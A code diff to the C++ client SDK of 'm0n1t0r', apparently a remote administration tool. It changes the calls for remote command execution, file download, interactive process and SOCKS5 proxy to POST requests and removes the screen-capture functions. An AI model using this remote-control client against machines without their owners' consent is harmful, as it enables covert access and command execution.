@@ -1,7 +1,6 @@
 #include "common.h"
 #include "m0n1t0r-sdk.h"
 #include <cpr/cpr.h>
-#include <fmt/format.h>
 #include <nlohmann/json.hpp>
 #include <spdlog/spdlog.h>
 
@@ -93,15 +92,15 @@ Client::File Client::getFileInfo(const std::string &path) {
 
 std::string Client::proxySocks5() {
   auto res =
-      cpr::Get(cpr::Url(fmt::format("{}/proxy/socks5/noauth", base_url)));
+      cpr::Post(cpr::Url(fmt::format("{}/proxy/socks5/noauth", base_url)));
   auto json = getBodyJson(res);
   return json;
 }
 
 std::string Client::proxySocks5(const std::string &name,
                                 const std::string &password) {
-  auto res = cpr::Get(cpr::Url(fmt::format("{}/proxy/socks5/pass", base_url)),
-                      cpr::Parameters{{"name", name}, {"password", password}});
+  auto res = cpr::Post(cpr::Url(fmt::format("{}/proxy/socks5/pass", base_url)),
+                       cpr::Payload{{"name", name}, {"password", password}});
   auto json = getBodyJson(res);
   return json;
 }
@@ -115,8 +114,8 @@ Client::CommandOutput Client::CommandOutput::fromJson(nlohmann::json json) {
 }
 
 Client::CommandOutput Client::executeCommand(const std::string &command) {
-  auto res = cpr::Get(cpr::Url(fmt::format("{}/process/execute/{}", base_url,
-                                           cpr::util::urlEncode(command))));
+  auto res = cpr::Post(cpr::Url(fmt::format("{}/process/execute", base_url)),
+                       cpr::Payload{{"command", command}});
   auto json = getBodyJson(res);
   return CommandOutput::fromJson(json);
 }
@@ -127,13 +126,6 @@ Client::Process Client::Process::fromJson(nlohmann::json json) {
       json["exe"].is_null() ? "[unknown]" : json["exe"],
       json["name"],
       json["pid"],
-  };
-}
-
-Client::Availability Client::Availability::fromJson(nlohmann::json json) {
-  return Availability{
-      json["has_permission"],
-      json["support"],
   };
 }
 
@@ -149,9 +141,8 @@ std::vector<Client::Process> Client::listProcesses() {
 }
 
 void Client::download(const std::string &path, const std::string &url) {
-  auto res = cpr::Put(cpr::Url(fmt::format("{}/network/download/{}/{}",
-                                           base_url, cpr::util::urlEncode(url),
-                                           cpr::util::urlEncode(path))));
+  auto res = cpr::Post(cpr::Url(fmt::format("{}/network/download", base_url)),
+                       cpr::Payload{{"url", url}, {"path", path}});
   auto json = getBodyJson(res);
 }
 
@@ -159,18 +150,6 @@ Client::SystemInfo Client::getSystemInfo() {
   auto res = cpr::Get(cpr::Url(fmt::format("{}/info/system", base_url)));
   auto json = getBodyJson(res);
   return SystemInfo::fromJson(json);
-}
-
-Client::Availability Client::canCaptureScreen() {
-  auto res = cpr::Get(cpr::Url(fmt::format("{}/screen", base_url)));
-  auto json = getBodyJson(res);
-  return Availability::fromJson(json);
-}
-
-bool Client::requestCapturePermission() {
-  auto res = cpr::Put(cpr::Url(fmt::format("{}/screen", base_url)));
-  auto json = getBodyJson(res);
-  return true;
 }
 
 std::thread Client::executeCommandInteractive(
@@ -193,8 +172,8 @@ std::thread Client::executeCommandInteractive(
     c.set_close_handler(on_close);
 
     ws_client::connection_ptr con =
-        c.get_connection(fmt::format("ws://{}/process/interactive/{}", base_url,
-                                     cpr::util::urlEncode(proc)),
+        c.get_connection(fmt::format("ws://{}/process/interactive?command={}",
+                                     base_url, cpr::util::urlEncode(proc)),
                          ec);
 
     if (ec) {
@@ -219,45 +198,6 @@ std::thread Client::executeCommandInteractive(
       }
     }).detach();
 
-    c.run();
-  });
-}
-
-std::thread
-Client::captureScreen(std::function<bool(const std::string &)> callback,
-                      std::function<void()> close, const std::string &format) {
-  return std::thread([=]() {
-    ws_client c;
-    websocketpp::lib::error_code ec;
-    auto on_message = [=, &c](websocketpp::connection_hdl h,
-                              ws_client::message_ptr msg) {
-      if (msg->get_opcode() != websocketpp::frame::opcode::binary) {
-        return;
-      }
-
-      auto handle = c.get_con_from_hdl(h);
-      auto cont = callback(msg->get_payload());
-
-      if (cont == false) {
-        handle->close(websocketpp::close::status::normal, "Bye");
-      }
-    };
-    auto on_close = [=, &c](websocketpp::connection_hdl) { close(); };
-
-    c.init_asio();
-    c.set_message_handler(on_message);
-    c.set_close_handler(on_close);
-
-    ws_client::connection_ptr con = c.get_connection(
-        fmt::format("ws://{}/screen/{}", base_url, format), ec);
-
-    if (ec) {
-      auto message =
-          fmt::format("Could not create connection because: {}", ec.message());
-      spdlog::error(message);
-      throw std::runtime_error(message);
-    }
-    c.connect(con);
     c.run();
   });
 }
